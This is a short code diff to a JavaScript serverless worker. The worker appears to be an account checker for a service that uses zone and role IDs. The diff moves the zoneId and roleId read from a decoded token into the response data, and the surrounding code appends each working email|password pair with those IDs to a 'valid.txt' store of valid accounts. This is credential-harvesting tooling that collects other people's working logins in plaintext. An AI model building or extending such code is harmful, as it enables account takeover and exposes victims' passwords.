@@ -152,17 +152,15 @@ export default {
 
           const delete_token = await getDeleteToken(guid, session_token);
 
-          let zone_id = "N/A";
-          let role_id = "N/A";
-
           if (delete_token) {
             const decoded = decodeJWTPayload(delete_token);
             const ext = decoded.Ext || {};
-            zone_id = ext.zoneId || "N/A";
-            role_id = ext.roleId || "N/A";
+            // Embed zoneId dan roleId ke response data agar frontend mudah baca
+            data.data.zoneId = ext.zoneId || "N/A";
+            data.data.roleId = ext.roleId || "N/A";
           }
 
-          const line = `${email}|${password}|ZoneID:${zone_id}|RoleID:${role_id}\n`;
+          const line = `${email}|${password}|ZoneID:${data.data.zoneId}|RoleID:${data.data.roleId}\n`;
 
           let old = (await env.VALID_ACCOUNTS.get("valid.txt")) || "";
           old += line;
